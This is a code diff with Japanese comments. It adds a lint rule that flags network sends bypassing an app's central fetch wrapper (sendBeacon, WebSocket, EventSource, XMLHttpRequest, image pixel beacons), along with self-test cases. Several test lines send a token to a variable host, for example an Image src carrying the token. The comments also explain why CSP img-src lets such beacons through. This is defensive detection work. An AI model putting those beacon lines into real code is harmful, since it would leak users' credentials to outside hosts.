@@ -354,6 +354,44 @@ const FORBIDDEN_PATTERNS = [
     rationale: '文字列を渡す形は eval 相当 — invariant #9。関数を渡すこと',
   },
   {
+    /*
+     * **`fetch` 以外の送信手段。**
+     *
+     * 2026-08-26 の実測: 資格情報の流出経路の台帳 (`lint:network-targets`) が
+     * 知っている「通信」は `fetch` 一族の**関数名 9 つ**だけで、
+     * `navigator.sendBeacon` / `new WebSocket` / `new XMLHttpRequest` /
+     * `new Image().src =` は視界の外だった。トークンを可変ホストへ載せる
+     * 4 本を植えて回したところ**全ゲートが緑**で、しかも台帳は
+     * 「✅ 送り先が変数の通信 13 件はすべて台帳にあり」と印字した ——
+     * あの一文は `fetch` 一族についてしか真でない。
+     *
+     * これらは中央の口を通らないので、`limitedFetch` の打ち切りも
+     * `readCapped` の上限も `redactSecrets` も**構造的に掛からない**
+     * (0-a-18 の形。中心の口に守りを入れても、その口を使わない経路は
+     * 守られない)。`sendBeacon` は応答を持たず unload を跨いで飛ぶので、
+     * 呼び出し側で結果を確かめる手立てすら無い。
+     *
+     * **CSP は当てにできない。** ブラウザ版は `connect-src 'self' https:`、
+     * デスクトップ版は `connect-src 'self'` だが、**両方とも
+     * `img-src 'self' data: https:`** である (SaaS のサムネイルとアバターに
+     * 要る。`safeImageSrc` はスキームの関門であって送り先の関門ではない)。
+     * つまり `new Image().src = 'https://…/p.gif?t=' + token` は
+     * **どちらの出荷物でも CSP を通る**。ブラウザ版の renderer は
+     * 解錠後に平文のトークンを持つので、ここが唯一の関門になる。
+     *
+     * 2026-08-26 時点で実在 0 件。足すときは送り先の絞り方と、
+     * 上の 3 つ (打ち切り・上限・伏字) をどう代替するかをここに書くこと。
+     */
+    name: 'fetch 以外の送信 (sendBeacon / WebSocket / EventSource / XMLHttpRequest / new Image)',
+    pattern:
+      /\bnavigator\.sendBeacon\s*\(|\bnew\s+(?:WebSocket|EventSource|XMLHttpRequest|Image)\s*\(|\bcreateElement\s*\(\s*['"`]img['"`]\s*\)/,
+    codeOnly: true,
+    rationale:
+      '中央の口 (limitedFetch) を通らないので打ち切り・応答上限・伏字がどれも掛からない。' +
+      'img は CSP の img-src が https: を許しているため出荷物でも通る。' +
+      '足すなら送り先の絞り方と 3 つの代替をこの台帳に書くこと',
+  },
+  {
     // window.postMessage の受け口。origin を確かめない listener は
     // 任意のページからアプリ内部へ命令を送れる入口になる。2026-08 の監査時点で
     // 0 件なので allowFile は無い — 足すときは event.origin の確認と一緒に、
@@ -941,6 +979,22 @@ function selfTest() {
     ['型宣言は通す', '  tokenUrl: string;', 0],
     ['表から読んで渡すのは通す (これが正しい形)', '    fetchFn(config.tokenUrl, {', 0],
     ['認可 URL の組み立ても通す', '  return `${config.authorizeUrl}?${params.toString()}`;', 0],
+
+    /*
+     * fetch 以外の送信。**4 つの別名それぞれに標本を置く** —— 1 つしか
+     * 置かないと、残る 3 つは字面を書き換えられても誰も気付かない
+     * (この self-test が 2026-08-25 に見つけた欠陥がまさにそれ)。
+     */
+    ['sendBeacon は送信とみなす', '  navigator.sendBeacon(`https://${h}/c`, tok);', 1],
+    ['WebSocket は送信とみなす', '  const ws = new WebSocket(`wss://${h}/s`);', 1],
+    ['EventSource は送信とみなす', '  const es = new EventSource(`https://${h}/e`);', 1],
+    ['XMLHttpRequest は送信とみなす', '  const x = new XMLHttpRequest();', 1],
+    ['new Image() は送信とみなす (画素ビーコン)', "  new Image().src = `https://${h}/p.gif?t=${tok}`;", 1],
+    ['createElement(\'img\') も同じ', "  const el = document.createElement('img');", 1],
+    /* 陰性対照 —— 正しい形と、名前が字面に出るだけの行。 */
+    ['陰性対照: 素の fetch はこの規則では鳴らない', '  await fetch(url, init);', 0],
+    ['陰性対照: JSX の <img> は通す (safeImageSrc を通る正しい形)', '  <img src={thumbSrc} alt="" />', 0],
+    ['陰性対照: 名前が注釈に出るだけなら鳴らない', '  // sendBeacon や new WebSocket は使わない', 0],
   ];
 
   /*
